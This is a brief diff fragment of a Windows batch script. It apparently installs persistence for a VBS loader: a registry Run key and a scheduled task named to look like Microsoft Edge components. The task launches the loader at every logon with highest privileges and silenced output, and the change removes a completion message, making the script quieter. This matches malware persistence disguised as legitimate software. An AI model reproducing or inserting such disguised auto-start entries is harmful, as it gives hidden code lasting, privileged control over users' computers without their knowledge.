@@ -81,7 +81,6 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "EdgeCoreVbs" /t
 
 schtasks /create /tn "EdgeCoreRepair" /tr "wscript.exe \"%VBS_LDR%\"" /sc onlogon /rl highest /f /np >nul 2>&1
 
-echo Islem tamamlandi.
 timeout /t 3 >nul
 
 endlocal
